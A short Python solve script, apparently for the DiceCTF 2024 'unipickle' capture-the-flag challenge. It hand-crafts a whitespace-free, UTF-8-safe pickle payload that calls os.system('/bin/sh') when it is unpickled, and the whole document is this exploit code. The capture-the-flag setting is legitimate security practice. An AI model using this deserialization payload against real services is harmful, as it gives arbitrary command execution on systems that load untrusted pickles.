# challege link: https://github.com/dicegang/dicectf-quals-2024-challenges/tree/main/misc/unipickle


import pickle
import pickaxe


s1 = "os"
s2 = "system"
s3 = "/bin/sh"

crafter = pickaxe.Crafter()
crafter.push_str(s1)
crafter.push_str(s2)

crafter.put_memo(0xc2)
crafter.add_payload(pickle.STACK_GLOBAL)

crafter.mark()
crafter.push_str(s3)
crafter.to_tuple(use_mark=True)
crafter.reduce()
crafter.stop()

payload = crafter.get_payload()

try:
    # check: unicode-safe
    payload_s = payload.decode("utf-8")
    # check: not splitted
    assert len(payload_s.split()) == 1
    # pop a shell
    pickle.loads(payload)
except:
    print("????")

